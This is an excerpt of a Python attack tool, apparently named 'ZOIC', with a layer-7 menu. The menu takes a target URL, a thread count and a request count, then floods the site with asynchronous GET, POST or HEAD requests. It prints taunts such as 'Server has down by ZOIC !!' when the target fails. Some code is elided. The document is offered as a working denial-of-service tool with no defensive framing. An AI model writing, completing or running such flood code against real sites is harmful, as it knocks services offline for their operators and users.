...
def layer7():
    while True:
        logo()
        select = input(TextColors.DARK_RED + """═══[root@ZOIC~$]                                                                   
═══> """ + TextColors.RESET)
        ...
        if select == "1" or select.lower() == "1":
            async def send_request(session, url):
                try:
                    async with session.get(url) as response:
                        print(TextColors.LIGHT_GREEN + f"[+] Url : {url} [*] GET Request : {get_requests}" + TextColors.RESET)
            ...
            url = input(TextColors.LIGHT_RED + "URL > "+ TextColors.RESET)
            threads = int(input(TextColors.LIGHT_RED + "Thread (10~50) > "+ TextColors.RESET))  
            get_requests = int(input(TextColors.LIGHT_RED + "Get (100~1000) > "+ TextColors.RESET))    
            ...
            async def send_post_request(session, url):
                try:
                    async with session.post(url) as response:
                        print(TextColors.LIGHT_GREEN + f"[+] Url : {url} [*] POST Request : {post_requests}" + TextColors.RESET)
                except aiohttp.ClientConnectorError:
                    print(TextColors.CRIMSON + f"[-] Server has down by ZOIC !!" + TextColors.RESET)
                except aiohttp.client_exceptions.ServerDisconnectedError:
            ...
            url = input(TextColors.LIGHT_RED + "URL > "+ TextColors.RESET)
            threads = int(input(TextColors.LIGHT_RED + "Thread (10~50) > "+ TextColors.RESET))  
            post_requests = int(input(TextColors.LIGHT_RED + "Get (100~1000) > "+ TextColors.RESET))   
            ...
            async def send_head_request(session, url):
                try:
                    async with session.head(url) as response:
                        print(TextColors.LIGHT_GREEN + f"[+] Url : {url} [*] HEAD Request : {head_requests}" + TextColors.RESET)
                except aiohttp.ClientConnectorError:
                    print(TextColors.CRIMSON + f"[-] Server has down by ZOIC !!" + TextColors.RESET)
                except aiohttp.client_exceptions.ServerDisconnectedError:
                    print(TextColors.CRIMSON + f"[-] Server disconnected by ZOIC !!" + TextColors.RESET)
            ...
            url = input(TextColors.LIGHT_RED + "URL > "+ TextColors.RESET)
            threads = int(input(TextColors.LIGHT_RED + "Thread (10~50) > "+ TextColors.RESET))  
            head_requests = int(input(TextColors.LIGHT_RED + "Get (100~1000) > "+ TextColors.RESET))  
